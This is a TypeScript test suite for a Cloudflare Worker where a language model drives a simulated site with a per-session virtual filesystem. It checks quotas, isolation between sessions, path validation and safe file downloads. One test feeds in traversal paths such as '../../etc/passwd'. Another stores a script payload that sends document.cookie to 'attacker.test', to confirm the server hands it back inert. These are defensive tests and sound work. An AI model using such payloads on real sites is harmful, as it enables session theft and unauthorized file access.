import { env } from "cloudflare:test";
import { describe, expect, it } from "vitest";
import { handleHarnessAttachment, handleHarnessReset, handleSimulatedRequest } from "../src/kernel/handle";
import { LIMITS } from "../src/kernel/limits";
import { deriveStorageNamespace } from "../src/kernel/session";
import {
  countingEnv,
  filesystemRequest,
  final,
  mockGroq,
  page,
  readSite,
  sessionIdFromCookie,
  siteRequest,
  storedStateJson,
} from "./helpers";
import type { CountedEnv } from "./helpers";

const SALT = "test-salt";

async function newSession(testEnv: CountedEnv): Promise<string> {
  const result = await readSite(
    await handleSimulatedRequest(siteRequest({ path: "/" }), testEnv, {
      inference: mockGroq([final({ state: { seeded: true } })]),
    }),
  );
  return result.sessionCookie!;
}

async function namespaceFor(cookie: string): Promise<string> {
  return deriveStorageNamespace(sessionIdFromCookie(cookie), SALT);
}

function attachmentRequest(path: string, cookie: string | null): Request {
  const headers = new Headers();
  if (cookie) headers.set("cookie", cookie);
  return new Request(`https://example.test/__harness/attachment?path=${encodeURIComponent(path)}`, { headers });
}

describe("exceptional virtual filesystem", () => {
  it("15. a valid exceptional read request causes bounded storage access and exactly one second inference", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const namespace = await namespaceFor(cookie);
    await env.VFS_BUCKET.put(`${namespace}/exports/ledger.csv`, "date,amount\n2026-09-01,12\n", {
      httpMetadata: { contentType: "text/csv" },
    });
    const callsBefore = testEnv.storageCalls.length;

    const groq = mockGroq([
      filesystemRequest([{ op: "read", path: "/exports/ledger.csv", limit: null, max_bytes: 4096 }]),
      final({ body: page("<h1>Ledger</h1>"), state: { viewed: "ledger" } }),
    ]);

    const result = await readSite(
      await handleSimulatedRequest(siteRequest({ path: "/exports/ledger.csv", cookie }), testEnv, { inference: groq }),
    );

    expect(result.status).toBe(200);
    expect(result.telemetry.inferences).toBe(2);
    expect(result.telemetry.filesystem.secondInference).toBe(true);
    expect(result.telemetry.filesystem.untouched).toBe(false);
    expect(result.telemetry.filesystem.necessityChars).toBeGreaterThan(0);
    expect(result.telemetry.filesystem.readOpsAttempted).toBe(1);
    expect(result.telemetry.filesystem.readOpsAccepted).toBe(1);
    expect(result.telemetry.filesystem.read).toBeGreaterThan(0);
    expect(result.telemetry.filesystem.read).toBeLessThanOrEqual(LIMITS.fsReadBytes);

    // Bounded: a couple of storage calls, not a scan.
    expect(testEnv.storageCalls.slice(callsBefore).length).toBeLessThanOrEqual(2);

    // The second inference carried only the bounded results, appended after the
    // stable prefix and the original request.
    expect(groq.callCount).toBe(2);
    const second = groq.prompts[1]!;
    expect(second).toHaveLength(4);
    expect(second[2]!.role).toBe("assistant");
    expect(second[3]!.content).toContain("FILESYSTEM_RESULTS");
    expect(second[3]!.content).toContain("date,amount");
    expect(second[3]!.content).not.toContain(namespace);

    // Telemetry proves what happened in counts and bytes only.
    const observable = JSON.stringify(result.headers);
    expect(observable).not.toContain("ledger.csv");
    expect(observable).not.toContain("date,amount");
    expect(observable).not.toContain(namespace);
  });

  it("16. a recursive filesystem request is rejected and nothing is persisted", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const before = await storedStateJson(sessionIdFromCookie(cookie));

    const groq = mockGroq([
      filesystemRequest([{ op: "list", path: "/", limit: 10, max_bytes: null }]),
      filesystemRequest([{ op: "read", path: "/again.txt", limit: null, max_bytes: 100 }]),
    ]);

    const result = await readSite(
      await handleSimulatedRequest(siteRequest({ path: "/files", cookie }), testEnv, { inference: groq }),
    );

    expect(result.status).toBe(502);
    expect(result.telemetry.validation).toContain("output.recursive_filesystem_request");
    expect(result.telemetry.inferences).toBe(2);
    expect(result.telemetry.persisted).toBe("skipped");
    expect(await storedStateJson(sessionIdFromCookie(cookie))).toBe(before);
  });

  it("a filesystem request without a concrete necessity statement is refused before any storage call", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const callsBefore = testEnv.storageCalls.length;

    for (const necessity of ["", "need it", " ".repeat(30)]) {
      const result = await readSite(
        await handleSimulatedRequest(siteRequest({ path: "/x", cookie }), testEnv, {
          inference: mockGroq([filesystemRequest([{ op: "list", path: "/", limit: 5, max_bytes: null }], necessity)]),
        }),
      );
      expect(result.status).toBe(502);
      expect(result.telemetry.validation.join(",")).toMatch(/necessity/);
    }
    expect(testEnv.storageCalls.length).toBe(callsBefore);
  });

  it("17. cross-session access and traversal attempts are rejected", async () => {
    const testEnv = countingEnv();
    const victimCookie = await newSession(testEnv);
    const victimNamespace = await namespaceFor(victimCookie);
    await env.VFS_BUCKET.put(`${victimNamespace}/private/diary.txt`, "victim-only-content", {
      httpMetadata: { contentType: "text/plain" },
    });

    const attackerCookie = await newSession(testEnv);
    expect(attackerCookie).not.toBe(victimCookie);

    // Same virtual path, different session: it simply does not resolve.
    const groq = mockGroq([
      filesystemRequest([{ op: "read", path: "/private/diary.txt", limit: null, max_bytes: 1024 }]),
      final({ body: page("<h1>Nothing here</h1>") }),
    ]);
    const result = await readSite(
      await handleSimulatedRequest(siteRequest({ path: "/private/diary.txt", cookie: attackerCookie }), testEnv, { inference: groq }),
    );
    expect(result.status).toBe(200);
    const secondPrompt = groq.prompts[1]!.at(-1)!.content;
    expect(secondPrompt).toContain('"exists":false');
    expect(secondPrompt).not.toContain("victim-only-content");

    // Traversal, absolute storage keys and reserved prefixes never validate.
    for (const path of [
      "/../private/diary.txt",
      "/private/../../etc/passwd",
      "sessions/abc/private/diary.txt",
      "/__harness/attachment",
      "/api/request",
      "/private/diary%2Etxt",
    ]) {
      const attempt = await readSite(
        await handleSimulatedRequest(siteRequest({ path: "/probe", cookie: attackerCookie }), testEnv, {
          inference: mockGroq([filesystemRequest([{ op: "read", path, limit: null, max_bytes: 100 }])]),
        }),
      );
      expect(attempt.status, path).toBe(502);
      expect(attempt.telemetry.validation.join(","), path).toMatch(/filesystem_request\.path_/);
    }

    // The harness download endpoint is scoped the same way.
    expect((await handleHarnessAttachment(attachmentRequest("/private/diary.txt", attackerCookie), testEnv)).status).toBe(404);
    const owned = await handleHarnessAttachment(attachmentRequest("/private/diary.txt", victimCookie), testEnv);
    expect(owned.status).toBe(200);
    expect(await owned.text()).toBe("victim-only-content");
    expect((await handleHarnessAttachment(attachmentRequest("/private/diary.txt", null), testEnv)).status).toBe(404);
  });

  it("18. file size, count, MIME, encoding and session quotas are enforced", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const necessity = "The visitor explicitly asked for a downloadable file artifact.";

    const write = async (mutation: Record<string, unknown>) =>
      readSite(
        await handleSimulatedRequest(siteRequest({ method: "POST", path: "/files", body: {}, cookie }), testEnv, {
          inference: mockGroq([final({ mutations: [mutation], state: { attempted: true } })]),
        }),
      );

    // Disallowed MIME type: rejected at validation, so nothing is written.
    const badMime = await write({ op: "write", path: "/x.wasm", encoding: "utf8", content: "x", content_type: "application/wasm", necessity });
    expect(badMime.status).toBe(502);
    expect(badMime.telemetry.validation).toContain("filesystem_mutations.content_type_not_allowlisted");

    // Malformed base64.
    const badBase64 = await write({ op: "write", path: "/x.bin", encoding: "base64", content: "!!!not base64!!!", content_type: "application/octet-stream", necessity });
    expect(badBase64.telemetry.filesystem.mutationsAccepted).toBe(0);
    expect(badBase64.telemetry.filesystem.outcome).toBe("failed");

    // Oversized single file.
    const tooBig = await write({ op: "write", path: "/big.txt", encoding: "utf8", content: "z".repeat(LIMITS.fsFileBytes + 10), content_type: "text/plain", necessity });
    expect(tooBig.telemetry.filesystem.mutationsAccepted).toBe(0);

    // Too many mutations in one transition.
    const tooMany = await readSite(
      await handleSimulatedRequest(siteRequest({ method: "POST", path: "/files", body: {}, cookie }), testEnv, {
        inference: mockGroq([
          final({
            mutations: Array.from({ length: LIMITS.fsMutationsPerRequest + 1 }, (_, i) => ({
              op: "write",
              path: `/f${i}.txt`,
              encoding: "utf8",
              content: "x",
              content_type: "text/plain",
              necessity,
            })),
          }),
        ]),
      }),
    );
    expect(tooMany.telemetry.validation).toContain("filesystem_mutations.too_many");

    // Per-session file-count quota.
    const namespace = await namespaceFor(cookie);
    for (let i = 0; i < LIMITS.fsSessionFiles; i++) {
      await env.VFS_BUCKET.put(`${namespace}/seed/${i}.txt`, "x", { httpMetadata: { contentType: "text/plain" } });
    }
    const overCount = await write({ op: "write", path: "/one-too-many.txt", encoding: "utf8", content: "x", content_type: "text/plain", necessity });
    expect(overCount.telemetry.filesystem.mutationsAccepted).toBe(0);

    // Per-session byte quota, checked independently of the file count.
    const fresh = await newSession(testEnv);
    const freshNamespace = await namespaceFor(fresh);
    await env.VFS_BUCKET.put(`${freshNamespace}/bulk.bin`, "b".repeat(LIMITS.fsSessionBytes - 10), {
      httpMetadata: { contentType: "application/octet-stream" },
    });
    const overBytes = await readSite(
      await handleSimulatedRequest(siteRequest({ method: "POST", path: "/files", body: {}, cookie: fresh }), testEnv, {
        inference: mockGroq([
          final({
            mutations: [{ op: "write", path: "/more.txt", encoding: "utf8", content: "y".repeat(1000), content_type: "text/plain", necessity }],
          }),
        ]),
      }),
    );
    expect(overBytes.telemetry.filesystem.mutationsAccepted).toBe(0);
  });

  it("19. an explicitly requested harmless file is written and retrieved with no domain-specific handler", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const csv = "concept,created\nkettle,2026-09-01\n";

    const created = await readSite(
      await handleSimulatedRequest(siteRequest({ method: "POST", path: "/exports", body: { format: "csv" }, cookie }), testEnv, {
        inference: mockGroq([
          final({
            status: 201,
            body: page('<h1>Export ready</h1><p><a href="/__harness/attachment?path=%2Fexports%2Fconcepts.csv">Download</a></p>'),
            state: { exports: [{ path: "/exports/concepts.csv" }] },
            mutations: [
              {
                op: "write",
                path: "/exports/concepts.csv",
                encoding: "utf8",
                content: csv,
                content_type: "text/csv",
                necessity: "The visitor asked for a downloadable CSV export, which is inherently file-shaped.",
              },
            ],
          }),
        ]),
      }),
    );

    expect(created.status).toBe(201);
    expect(created.telemetry.filesystem.mutationsAccepted).toBe(1);
    expect(created.telemetry.filesystem.written).toBe(csv.length);
    expect(created.telemetry.filesystem.outcome).toBe("applied");
    // Every storage touch reports the justification it rested on.
    expect(created.telemetry.filesystem.necessityChars).toBeGreaterThan(0);
    expect(created.telemetry.persisted).toBe("ok");
    // The download link survives sanitization.
    expect(created.body).toContain("/__harness/attachment?path=%2Fexports%2Fconcepts.csv");

    const download = await handleHarnessAttachment(attachmentRequest("/exports/concepts.csv", cookie), testEnv);
    expect(download.status).toBe(200);
    expect(await download.text()).toBe(csv);
    expect(download.headers.get("content-disposition")).toBe('attachment; filename="concepts.csv"');
    expect(download.headers.get("x-content-type-options")).toBe("nosniff");
    expect(JSON.stringify([...download.headers])).not.toContain("sessions/");

    // The model can also delete it again, still with no domain handler.
    const deleted = await readSite(
      await handleSimulatedRequest(siteRequest({ method: "DELETE", path: "/exports/concepts.csv", cookie }), testEnv, {
        inference: mockGroq([
          final({
            status: 204,
            body: "",
            state: { exports: [] },
            mutations: [
              {
                op: "delete",
                path: "/exports/concepts.csv",
                encoding: null,
                content: null,
                content_type: null,
                necessity: "The visitor asked to remove the export artifact they had created.",
              },
            ],
          }),
        ]),
      }),
    );
    expect(deleted.telemetry.filesystem.mutationsAccepted).toBe(1);
    expect((await handleHarnessAttachment(attachmentRequest("/exports/concepts.csv", cookie), testEnv)).status).toBe(404);
  });

  it("20. stored active content is never executed or served as active content", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const hostile = '<script>fetch("https://attacker.test/?c="+document.cookie)</script><h1>hi</h1>';

    await readSite(
      await handleSimulatedRequest(siteRequest({ method: "PUT", path: "/pages/raw.html", body: {}, cookie }), testEnv, {
        inference: mockGroq([
          final({
            body: page("<h1>Stored</h1>"),
            state: { stored: "/pages/raw.html" },
            mutations: [
              {
                op: "write",
                path: "/pages/raw.html",
                encoding: "utf8",
                content: hostile,
                content_type: "text/html",
                necessity: "The visitor uploaded an HTML fragment and asked for it to be kept as a file.",
              },
            ],
          }),
        ]),
      }),
    );

    const download = await handleHarnessAttachment(attachmentRequest("/pages/raw.html", cookie), testEnv);
    expect(download.status).toBe(200);
    // Stored bytes are preserved exactly, but handed back inert.
    expect(await download.text()).toBe(hostile);
    expect(download.headers.get("content-type")).toBe("application/octet-stream");
    expect(download.headers.get("content-disposition")).toContain("attachment");
    expect(download.headers.get("x-content-type-options")).toBe("nosniff");
    expect(download.headers.get("content-security-policy")).toContain("default-src 'none'");
  });

  it("compensates a state write that fails after mutations were applied, and says so", async () => {
    const testEnv = countingEnv({
      STATE_DB: new Proxy(env.STATE_DB, {
        get(target, property, receiver) {
          if (property === "prepare") {
            return (sql: string) =>
              sql.trimStart().toUpperCase().startsWith("UPDATE SESSIONS")
                ? { bind: () => ({ run: async () => ({ meta: { changes: 0 } }) }) }
                : target.prepare(sql);
          }
          return Reflect.get(target, property, receiver);
        },
      }) as D1Database,
    });
    const cookie = await newSession(countingEnv());

    const result = await readSite(
      await handleSimulatedRequest(siteRequest({ method: "POST", path: "/exports", body: {}, cookie }), testEnv, {
        inference: mockGroq([
          final({
            mutations: [
              {
                op: "write",
                path: "/exports/orphan.txt",
                encoding: "utf8",
                content: "should not survive",
                content_type: "text/plain",
                necessity: "The visitor asked for a file artifact they can download afterwards.",
              },
            ],
          }),
        ]),
      }),
    );

    expect(result.status).toBe(409);
    expect(result.telemetry.persisted).toBe("conflict");
    // Newly created object was rolled back; the report never claims atomicity.
    expect(result.telemetry.filesystem.outcome).toBe("compensated");
    const namespace = await namespaceFor(cookie);
    expect(await env.VFS_BUCKET.head(`${namespace}/exports/orphan.txt`)).toBeNull();
  });

  it("resetting a session clears its state and its isolated objects", async () => {
    const testEnv = countingEnv();
    const cookie = await newSession(testEnv);
    const namespace = await namespaceFor(cookie);
    await env.VFS_BUCKET.put(`${namespace}/keep.txt`, "bytes", { httpMetadata: { contentType: "text/plain" } });

    const response = await handleHarnessReset(
      new Request("https://example.test/__harness/reset", { method: "POST", headers: { cookie } }),
      testEnv,
    );

    // The visitor is sent back to a site that no longer remembers them.
    expect(response.status).toBe(303);
    expect(response.headers.get("location")).toBe("/");
    expect(response.headers.get("set-cookie")).toContain("Max-Age=0");
    expect(response.headers.get("x-las-reset")).toContain("files_deleted=1");
    expect(await env.VFS_BUCKET.head(`${namespace}/keep.txt`)).toBeNull();
    expect(await storedStateJson(sessionIdFromCookie(cookie))).toBe("null");
  });
});
